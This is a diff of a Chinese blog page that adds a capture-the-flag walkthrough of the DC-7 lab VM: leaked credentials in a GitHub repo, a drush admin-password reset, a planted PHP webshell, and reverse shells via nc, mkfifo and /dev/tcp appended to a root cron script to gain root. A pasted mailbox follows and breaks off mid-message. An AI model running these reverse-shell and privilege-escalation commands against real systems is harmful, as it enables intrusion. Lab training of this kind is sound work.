@@ -475,14 +475,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    336
+                    4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    22 分
                 </div>
                 
 
@@ -498,7 +498,27 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="渗透测试—DC-7"><a href="#渗透测试—DC-7" class="headerlink" title="渗透测试—DC_7"></a>渗透测试—DC_7</h1><h2 id="一、主机发现及端口扫描"><a href="#一、主机发现及端口扫描" class="headerlink" title="一、主机发现及端口扫描"></a>一、主机发现及端口扫描</h2><p>首先还是来进行主机发现，使用之前编写的 <code>ARP</code> 扫描脚本</p>
+                <h1 id="渗透测试—DC-7"><a href="#渗透测试—DC-7" class="headerlink" title="渗透测试—DC_7"></a>渗透测试—DC_7</h1><p>关于本次靶机的介绍</p>
+<pre class="line-numbers language-bash"><code class="language-bash">DC-7 is another purposely built vulnerable lab with the intent of gaining experience <span class="token keyword">in</span> the world of penetration testing.
+While this isn<span class="token string">'t an overly technical challenge, it isn'</span>t exactly easy.
+While it<span class="token string">'s kind of a logical progression from an earlier DC release (I won'</span>t tell you <span class="token function">which</span> one<span class="token punctuation">)</span>, there are some new concepts involved, but you will need to figure those out <span class="token keyword">for</span> yourself. :-<span class="token punctuation">)</span> If you need to resort to brute forcing or dictionary attacks, you probably won<span class="token string">'t succeed.
+What you will need to do, is to think "outside" of the box.
+Waaaaaay "outside" of the box. :-)
+The ultimate goal of this challenge is to get root and to read the one and only flag.
+Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
+For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won'</span>t give you the answer, instead, I<span class="token string">'ll give you an idea about how to move forward.
+Technical Information
+DC-7 is a VirtualBox VM built on Debian 64 bit, but there shouldn'</span>t be any issues running it on <span class="token function">most</span> PCs.
+I have tested this on VMWare Player, but <span class="token keyword">if</span> there are any issues running this VM <span class="token keyword">in</span> VMware, have a <span class="token function">read</span> through of this.
+It is currently configured <span class="token keyword">for</span> Bridged Networking, however, this can be changed to suit your requirements. Networking is configured <span class="token keyword">for</span> DHCP.
+Installation is simple - download it, unzip it, and <span class="token keyword">then</span> <span class="token function">import</span> it into VirtualBox or VMWare and away you go.
+Important
+While there should be no problems using this VM, by downloading it, you accept full responsibility <span class="token keyword">for</span> any unintentional damage that this VM may cause.
+In saying that, there shouldn<span class="token string">'t be any problems, but I feel the need to throw this out there just in case.
+Contact
+I'</span>m also very interested <span class="token keyword">in</span> hearing how people go about solving these challenges, so <span class="token keyword">if</span> you<span class="token string">'re up for writing a walkthrough, please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you'</span>ve DM<span class="token string">'d me if you'</span>d prefer<span class="token punctuation">)</span>.
+I can be contacted via Twitter - @DCAU7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="一、主机发现及端口扫描"><a href="#一、主机发现及端口扫描" class="headerlink" title="一、主机发现及端口扫描"></a>一、主机发现及端口扫描</h2><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><p>首先还是来进行主机发现，使用之前编写的 <code>ARP</code> 扫描脚本</p>
 <pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop/valecalida's_Sript<span class="token comment" spellcheck="true"># python3 ARP_Scan.py -i eth0 10.87.51.0/24</span>
 <span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span> Making ARP scan<span class="token punctuation">..</span>.
 IP: 10.87.51.2
@@ -506,7 +526,8 @@ IP: 10.87.51.1
 IP: 10.87.51.31
 IP: 10.87.51.254
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cost about 2.432021141052246 s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>得到主机 <code>IP</code> 地址为 <code>10.87.51.31</code> 后然后使用 <code>Nmap</code> 对目标主机进行端口扫描，也可以用之前写的端口扫描脚本进行扫描。</p>
+<p>得到主机 <code>IP</code> 地址为 <code>10.87.51.31</code> </p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>然后使用 <code>Nmap</code> 对目标主机进行端口扫描，也可以用之前写的端口扫描脚本进行扫描。</p>
 <pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop<span class="token comment" spellcheck="true"># nmap -A 10.87.51.31</span>
 22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>      OpenSSH 7.4p1 Debian 10+deb9u6 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
 <span class="token operator">|</span> ssh-hostkey: 
@@ -529,7 +550,427 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.9
 Network Distance: 1 hop
 Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="二、渗透测试流程"><a href="#二、渗透测试流程" class="headerlink" title="二、渗透测试流程"></a>二、渗透测试流程</h2>
+<h2 id="二、渗透测试流程"><a href="#二、渗透测试流程" class="headerlink" title="二、渗透测试流程"></a>二、渗透测试流程</h2><h3 id="1、Google-Hacking"><a href="#1、Google-Hacking" class="headerlink" title="1、Google Hacking"></a>1、Google Hacking</h3><p>查看站点，发现在左下方有一个 <code>@DC7USER</code></p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQpUe.png">
+
+<p>使用 <code>Google</code> 进行搜索，发现了一个 <code>Titwer</code> 账户，里面提及了本次靶机，然后给出了一个 <code>Github</code> 地址</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQPCd.png">
+
+<img src="https://s1.ax1x.com/2020/05/08/YnQ94H.png">
+
+<h3 id="2、获取用户名密码"><a href="#2、获取用户名密码" class="headerlink" title="2、获取用户名密码"></a>2、获取用户名密码</h3><p>访问链接下面的链接</p>
+<pre class="line-numbers language-bash"><code class="language-bash">https://github.com/Dc7User/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到在这个账户中只有一个项目</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnMvDK.png">
+
+<p>把这个项目克隆到本地进行审查</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop/valecalida<span class="token string">'s_Sript# git clone  https://github.com/Dc7User/staffdb
+Cloning into '</span>staffdb'<span class="token punctuation">..</span>.
+remote: Enumerating objects: 21, done.
+remote: Counting objects: 100% <span class="token punctuation">(</span>21/21<span class="token punctuation">)</span>, done.
+remote: Compressing objects: 100% <span class="token punctuation">(</span>20/20<span class="token punctuation">)</span>, done.
+remote: Total 21 <span class="token punctuation">(</span>delta 9<span class="token punctuation">)</span>, reused 0 <span class="token punctuation">(</span>delta 0<span class="token punctuation">)</span>, pack-reused 0
+Unpacking objects: 100% <span class="token punctuation">(</span>21/21<span class="token punctuation">)</span>, 6.43 KiB <span class="token operator">|</span> 227.00 KiB/s, done.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在 <code>config.php</code> 中获取到了下面的内容</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+        <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span>
+        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"dc7user"</span><span class="token punctuation">;</span>
+        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"MdR3xOgB7#dW"</span><span class="token punctuation">;</span>
+        <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"Staff"</span><span class="token punctuation">;</span>
+        <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到，这是链接数据库的用户名、密码、数据库名，刚好 <code>Drupal</code> 有一个登录的地方尝试登录一下，发现登录失败，</p>
+<h3 id="3、SSH登录"><a href="#3、SSH登录" class="headerlink" title="3、SSH登录"></a>3、SSH登录</h3><p>还有 <code>SSH</code> 没试，尝试登录</p>
+<pre class="line-numbers language-bash"><code class="language-bash">C:\Users\Savalen<span class="token operator">></span>ssh dc7user@10.87.51.31
+dc7user@10.87.51.31's password:
+You have new mail.
+Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100
+dc7user@dc-7:~$ <span class="token function">whoami</span>
+dc7user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现登录上了，还有一封邮件，顺便查看一下本地文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash">dc7user@dc-7:~$ <span class="token function">ls</span> -Rl
+.:
+total 12
+drwxr-xr-x 2 dc7user dc7user 4096 May  8 04:00 backups
+-rw------- 1 dc7user dc7user 7938 Aug 30  2019 mbox
+
+./backups:
+total 30116
+-rw-r--r-- 1 dc7user dc7user   839385 May  8 04:00 website.sql.gpg
+-rw-r--r-- 1 dc7user dc7user 29997015 May  8 04:00 website.tar.gz.gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现在 <code>/backups</code> 文件夹下有两个文件，另外还有个 <code>mbox</code> 可能是刚才的邮件，邮件内容非常长，这里贴出重要的，全部内容在文件尾贴出</p>
+<pre class="line-numbers language-bash"><code class="language-bash">Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>去查看一下这个文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash">dc7user@dc-7:/opt/scripts$ <span class="token function">cat</span> backups.sh
+<span class="token comment" spellcheck="true">#!/bin/bash</span>
+<span class="token function">rm</span> /home/dc7user/backups/*
+<span class="token function">cd</span> /var/www/html/
+drush sql-dump --result-file<span class="token operator">=</span>/home/dc7user/backups/website.sql
+<span class="token function">cd</span> <span class="token punctuation">..</span>
+<span class="token function">tar</span> -czf /home/dc7user/backups/website.tar.gz html/
+gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
+gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
+<span class="token function">chown</span> dc7user:dc7user /home/dc7user/backups/*
+<span class="token function">rm</span> /home/dc7user/backups/website.sql
+<span class="token function">rm</span> /home/dc7user/backups/website.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="4、修改-Drupal-口令"><a href="#4、修改-Drupal-口令" class="headerlink" title="4、修改 Drupal 口令"></a>4、修改 <code>Drupal</code> 口令</h3><p>其中 <code>gpg</code> 命令是用来加密的，<code>drush</code> 则是 <code>Drupal</code> 框架用来修改配置的，可以修改用户名密码，进入到 <code>/var/www/html</code> 目录下</p>
+<pre class="line-numbers language-bash"><code class="language-bash">dc7user@dc-7:/opt/scripts$ <span class="token function">cd</span> /var/www/html/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>因为网站会有一个 <code>admin</code> 用户，所以使用 <code>drush</code> 命令修改 <code>admin</code> 用户的密码为 <code>admin</code> ，发现可以修改成功</p>
+<pre class="line-numbers language-bash"><code class="language-bash">dc7user@dc-7:/var/www/html$ drush user-password admin --password<span class="token operator">=</span><span class="token string">"admin"</span>
+Changed password <span class="token keyword">for</span> admin                                          <span class="token punctuation">[</span>success<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>接着使用用户名 <code>admin</code> 跟密码 <code>admin</code>登录到网站后台</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnMju6.png">
+
+<h3 id="5、添加-PHP-模块"><a href="#5、添加-PHP-模块" class="headerlink" title="5、添加 PHP 模块"></a>5、添加 <code>PHP</code> 模块</h3><p>在 <code>Content</code> —&gt; <code>Add content</code> –&gt; <code>Basic page</code> 下，准备添加 <code>PHP</code> 代码反弹 <code>shell</code> ，但发现 <code>Drupal 8</code>不支  <code>PHP</code> 代码，百度后知道 <code>Drupal 8</code> 后为了安全，需要将 <code>php</code> 单独作为一个模块导入，按照图片操作</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnMxHO.png">
+
+<p>将下面地址拷贝到</p>
+<pre class="line-numbers language-bash"><code class="language-bash">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/08/YnQSED.png">
+
+<p>安装完成后会有提示</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQi8A.png">
+
+<h3 id="6、启用-PHP-模块"><a href="#6、启用-PHP-模块" class="headerlink" title="6、启用 PHP 模块"></a>6、启用 <code>PHP</code> 模块</h3><p>然后选择 <code>[Enable newly added modules]</code></p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQFgI.png">
+
+<p>启用成功后会有提示</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQkvt.png">
+
+<h3 id="7、插入一句话木马"><a href="#7、插入一句话木马" class="headerlink" title="7、插入一句话木马"></a>7、插入一句话木马</h3><p>添加 <code>PHP</code> 代码，然后回到主页</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQEKP.png">
+
+<h3 id="8、反弹SHELL"><a href="#8、反弹SHELL" class="headerlink" title="8、反弹SHELL"></a>8、反弹SHELL</h3><p>使用中国蚁剑链接</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQVDf.png">
+
+<p>直接打开交互终端</p>
+<img src="https://s1.ax1x.com/2020/05/08/YnQZb8.png">
+
+<p>使用 <code>nc -e /bin/bash 10.87.51.31 9999</code> 反弹到 kali ，kali端接听，就能收到shell</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nc -lvvp 9999</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 9999 <span class="token punctuation">..</span>.
+10.87.51.31: inverse host lookup failed: Unknown host
+connect to <span class="token punctuation">[</span>10.87.51.17<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.87.51.31<span class="token punctuation">]</span> 60390
+<span class="token function">ls</span>
+backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>改善交互环境</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="9、修改关键文件"><a href="#9、修改关键文件" class="headerlink" title="9、修改关键文件"></a>9、修改关键文件</h3><p>查看 <code>backups.sh</code> 的属组信息，发现是属于 <code>www-data</code> 的，因此可以修改</p>
+<pre class="line-numbers language-bash"><code class="language-bash">www-data@dc-7:/opt/scripts$ <span class="token function">ls</span> -al backups.sh
+<span class="token function">ls</span> -al backups.sh
+-rwxrwxr-x 1 root www-data 520 Aug 29  2019 backups.sh
+www-data@dc-7:/opt/scripts$ <span class="token keyword">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.87.51.17 4444 >/tmp/f"</span> <span class="token operator">>></span> backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>也可以使用下面这个命令</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"bash –i >&amp; /dev/tcp/10.87.51.17/9999>&amp;1"</span> <span class="token operator">>></span> backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看是否写入成功，可以看到已经写入成功了</p>
+<pre class="line-numbers language-bash"><code class="language-bash">www-data@dc-7:/opt/scripts$ <span class="token function">cat</span> backups.sh
+<span class="token function">cat</span> backups.sh
+<span class="token comment" spellcheck="true">#!/bin/bash</span>
+<span class="token function">rm</span> /home/dc7user/backups/*
+<span class="token function">cd</span> /var/www/html/
+drush sql-dump --result-file<span class="token operator">=</span>/home/dc7user/backups/website.sql
+<span class="token function">cd</span> <span class="token punctuation">..</span>
+<span class="token function">tar</span> -czf /home/dc7user/backups/website.tar.gz html/
+gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
+gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
+<span class="token function">chown</span> dc7user:dc7user /home/dc7user/backups/*
+<span class="token function">rm</span> /home/dc7user/backups/website.sql
+<span class="token function">rm</span> /home/dc7user/backups/website.tar.gz
+<span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token operator">|</span>nc 10.87.51.17 4444 <span class="token operator">></span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过这个脚本来反弹 <code>shell</code> ，在 <code>Kali</code> 上监听 <code>4444</code>  这个端口，由于有计划任务对这个脚本进行操作，所以只需要等一下即可，结果等了将近10分钟，我去….</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nc -lvvp 4444</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
+10.87.51.31: inverse host lookup failed: Unknown host
+connect to <span class="token punctuation">[</span>10.87.51.17<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.87.51.31<span class="token punctuation">]</span> 36694
+/bin/sh: 0: can<span class="token string">'t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/theflag.txt
+cat: /etc/theflag.txt: No such file or directory
+# cat /root/theflag.txt
+
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  "Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and all those who have taken the time to complete these little
+challenges.
+
+I'</span>m sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="10、获取flag"><a href="#10、获取flag" class="headerlink" title="10、获取flag"></a>10、获取flag</h3><p>可以看到已经获得了 <code>root</code> 权限，直接查看 <code>/root/theflag.txt</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># id</span>
+uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># cat /etc/theflag.txt</span>
+cat: /etc/theflag.txt: No such <span class="token function">file</span> or directory
+<span class="token comment" spellcheck="true"># cat /root/theflag.txt</span>
+
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  <span class="token string">"Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="token string">"88b 888 "</span>88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88<span class="token punctuation">..</span>88P 888  888 Y8b.      <span class="token string">"   "</span>   <span class="token string">"   "</span>
+888P     Y888  <span class="token string">"Y8888  888 888      8888888P"</span>   <span class="token string">"Y88P"</span>  888  888  "Y8888  888 888 888 888
+
+
+Congratulations<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
+
+Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
+<span class="token function">who</span> have provided feedback, and all those <span class="token function">who</span> have taken the <span class="token function">time</span> to complete these little
+challenges.
+
+I'm sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>mbox</code> 文件内容</p>
+<pre class="line-numbers language-bash"><code class="language-bash">dc7user@dc-7:~$ <span class="token function">cat</span> mbox
+
+From root@dc-7 Thu Aug 29 17:00:22 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3EPu-0000CV-5C
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 17:00:22 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3EPu-0000CV-5C@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 17:00:22 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.tar.gz'</span> failed: File exists
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.sql'</span> failed: File exists
+
+From root@dc-7 Thu Aug 29 17:15:11 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3EeF-0000Dx-G1
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 17:15:11 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3EeF-0000Dx-G1@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 17:15:11 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.tar.gz'</span> failed: File exists
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.sql'</span> failed: File exists
+
+From root@dc-7 Thu Aug 29 17:30:11 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3Esl-0000Ec-JQ
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 17:30:11 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3Esl-0000Ec-JQ@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 17:30:11 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.tar.gz'</span> failed: File exists
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.sql'</span> failed: File exists
+
+From root@dc-7 Thu Aug 29 17:45:11 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 17:45:11 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3F7H-0000G3-Nb
